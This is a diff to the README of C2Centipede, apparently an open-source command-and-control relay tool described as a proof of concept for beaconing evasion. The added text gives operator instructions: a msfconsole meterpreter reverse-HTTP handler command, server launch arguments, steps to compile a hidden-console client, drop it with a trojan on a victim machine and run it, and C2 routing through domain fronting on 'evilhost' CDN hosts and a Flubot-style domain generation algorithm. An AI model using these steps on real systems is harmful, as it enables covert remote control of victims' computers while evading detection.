@@ -10,6 +10,12 @@ The server component receives the requests from the c2centipede client, decrypts
 
 Additionally there is a GUI for the operator.
 
+## Setup
+git clone https://github.com/deepsight/C2Centipede
+cd C2Centipede
+#install required libraries, TODO make requirements.txt
+git clone https://github.com/fatedier/frp
+
 
 ## Sample commands
 
@@ -19,18 +25,18 @@ The server uses python3
 1) Run your handler /msfconsole -x "use exploit/multi/handler;set payload python/meterpreter_reverse_http;set exitonsession false; set lport 8888; set lhost 0.0.0.0; run -j
 You can use any reverse HTTP payload, not just python.
 
+2)Generate your meterpreter (with msfvenom), empire or other trojan pointing to localhost and the port specified on the -p argument you will use in the c2centipede client (in this case 2233)
 
-2) python3 c2c_server.py -p 9093 -d 127.0.0.1:8888 -a lalala:lelele -b -f xkJSFO2DKQyYxj9F6Q4XCXIviiFuxNzZjsEfNc9NgoM=
-
+3) python3 c2c_server.py -p 9093 -d 127.0.0.1:8888 -a lalala:lelele -b -f xkJSFO2DKQyYxj9F6Q4XCXIviiFuxNzZjsEfNc9NgoM=
 -p port to listen to
 -d destination of the packages (This would be your MSF or Empire handler address)
 -a authentication for the c2centipede server, the operator needs to know these to send commands to the c2centipede server.
 -b beep (for debugging, you can listen to the beacons of your trojan)
 -f Fernet key, symmetric shared with the client. (if not specified it will generate a new one)
 
+4)Set your RFP proxies and/or CDNs.
 
-3)Set your RFP proxies and/or CDNs.
-
+5)To tests FRP servers, add them to valid_frp_tcp_clean_unique.txt
 
 ### On the victim machine
 The client uses python2 because _reasons_
@@ -44,6 +50,22 @@ The client uses python2 because _reasons_
 Optionally, you can compile the client for windows using pyinstaller
 wine pyinstaller.exe --onefile --noconsole c2c_client.py
 
-2)Generate your meterpreter, empire or other trojan pointing to localhost and the port specified on the -p argument (in this case 2233)
+2)Drop the c2centipede client script or executable and the trojan
 
 3)Run the trojan
+
+## Supported C2 routes
+
+The C2 communication can be routed through many hosts. They can be setup when executing the c2centipede client with the -s or -t flags. 
+
+Direct or connections through HTTP proxies (like FRP) can be specified as ip:port e.g. "-s 123.123.123.123:2222 222.333.45.23:80"
+
+Domain fronting can be specified in the following format: -s fronted{hightrustdomain.com{evilhost.yourcdnprovider.com fronted{anotherdomain.com{evilhost.yourcdnprovider.com fronted{anotherhightrustdomain.com{evilhost.anothercdn.com
+
+Flubot DGA can be used to bootstrap your C2 connection, the syntax is flubot{seed{numberofdomains{port
+This is based on this great post: https://securityblog.switch.ch/2021/06/19/android-flubot-enters-switzerland/
+
+
+## TODO
+Treat this as alpha quality code, it's meant to be a PoC for beaconing evasion.
+I have tested very basic functionality for doing C2 comms through webdav, so this might come later.
